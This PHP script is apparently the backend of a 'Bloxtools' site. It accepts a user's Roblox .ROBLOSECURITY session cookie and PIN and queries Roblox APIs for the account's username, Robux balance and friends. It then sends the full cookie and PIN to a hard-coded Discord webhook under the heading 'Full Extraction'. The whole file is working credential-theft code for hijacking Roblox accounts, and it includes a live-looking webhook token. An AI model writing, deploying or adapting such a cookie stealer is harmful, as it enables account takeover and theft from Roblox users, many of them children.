<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Only POST allowed']);
    exit;
}

$pin    = trim($_POST['pin'] ?? '');
$cookie = trim($_POST['cookie'] ?? '');

// Validate PIN
if (!preg_match('/^\d{4}$/', $pin)) {
    echo json_encode(['success' => false, 'message' => 'Invalid PIN format (must be 4 digits)']);
    exit;
}
if (strlen($cookie) < 30) {
    echo json_encode(['success' => false, 'message' => 'Cookie is too short or invalid']);
    exit;
}

// ---------- Roblox API caller ----------
function robloxRequest($url, $cookie) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie: .ROBLOSECURITY=' . $cookie
        ],
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpCode !== 200) return null;
    return json_decode($response, true);
}

// Get authenticated user
$user = robloxRequest('https://users.roblox.com/v1/users/authenticated', $cookie);
if (!$user || !isset($user['id'])) {
    echo json_encode(['success' => false, 'message' => 'Cookie is invalid or expired']);
    exit;
}

$userId = $user['id'];
$username = $user['name'] ?? $user['displayName'];

// Get Robux
$robuxData = robloxRequest('https://economy.roblox.com/v1/user/currency', $cookie);
$robux = $robuxData['robux'] ?? 'N/A';

// Get friends count
$friendsData = robloxRequest("https://friends.roblox.com/v1/users/{$userId}/friends/count", $cookie);
$friends = $friendsData['count'] ?? 'N/A';

// Last played game
$gamesData = robloxRequest("https://games.roblox.com/v1/users/{$userId}/games/playlisted", $cookie);
$lastGame = $gamesData['data'][0]['name'] ?? 'N/A';

// Avatar URL (public, no cookie needed)
$avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId={$userId}&width=420&height=420&format=png";

// ---------- Discord Webhook ----------
$webhookUrl = "https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";

$embed = [
    'title' => '🔐 .ROBLOSECURITY Cookie - Full Extraction',
    'description' => "**PIN:** `{$pin}`\n\n**Full Cookie:**\n```\n{$cookie}\n```",
    'color' => 0x8c52ff,
    'thumbnail' => ['url' => $avatarUrl],
    'fields' => [
        ['name' => '👤 Roblox Account', 'value' => "**Username:** {$username}\n**User ID:** {$userId}\n[Profile](https://www.roblox.com/users/{$userId}/profile)", 'inline' => false],
        ['name' => '💰 Robux', 'value' => "**Available:** {$robux} R$", 'inline' => true],
        ['name' => '👥 Friends', 'value' => "**Total:** {$friends}", 'inline' => true],
        ['name' => '🎮 Last Game Played', 'value' => $lastGame, 'inline' => true],
        ['name' => '🍪 Cookie', 'value' => "**Length:** " . strlen($cookie) . " chars", 'inline' => false]
    ],
    'footer' => ['text' => 'Bloxtools Advanced System'],
    'timestamp' => date('c')
];

$payload = json_encode([
    'username' => 'Bloxtools Processing System',
    'embeds' => [$embed]
]);

$ch = curl_init($webhookUrl);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_SSL_VERIFYPEER => true
]);
$result = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode === 204 || $httpCode === 200) {
    echo json_encode(['success' => true, 'message' => 'Successfully sent to Discord!']);
} else {
    echo json_encode(['success' => false, 'message' => "Discord webhook failed (HTTP {$httpCode})"]);
}
